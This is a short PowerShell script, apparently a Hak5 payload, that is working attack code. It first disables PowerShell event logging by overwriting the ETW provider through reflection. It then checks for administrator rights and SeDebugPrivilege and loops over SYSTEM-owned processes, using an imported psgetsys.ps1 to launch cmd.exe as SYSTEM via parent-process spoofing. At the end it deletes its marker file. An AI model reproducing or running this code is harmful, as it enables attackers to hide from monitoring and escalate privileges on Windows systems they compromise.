#
# Author:           TW-D
# Version:          1.0
#

# Disable "PowerShell" logging
$etw_provider = [Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Static")
$event_provider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etw_provider.SetValue($null, $event_provider)

# Check if current process have "Administrator" privilege
If ( ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") ) {

    # Check "SeDebugPrivilege" policy
    $whoami_output = WHOAMI /PRIV | Select-String -Pattern "SeDebugPrivilege"
    If ( ($whoami_output -clike "*Activ*") -Or ($whoami_output -clike "*Enabled*") ) { # For French/English OS

        # Retrieves the processes belonging to the "SYSTEM" account
        $system_processes = (Get-Process -IncludeUserName | ? {$_.UserName -like "*SYST*"}).Id # For English/French OS

        # For each system PID, test to obtain the "SYSTEM" account via the parent process
        Import-Module -Name ".\psgetsys.ps1"
        $system_processes | ForEach-Object {
            [MyProcess]::CreateProcessFromParent($_, "C:\WINDOWS\system32\cmd.exe", "/K ECHO Success > .\hak5_execution.txt")
            Start-Sleep -Seconds 5
            $success = Test-Path -Path "C:\WINDOWS\system32\hak5_execution.txt"
            If ($success) {
                # Cleanup
                Remove-Item -Path "C:\WINDOWS\system32\hak5_execution.txt" -Force
                Exit
            }
        }

    }

}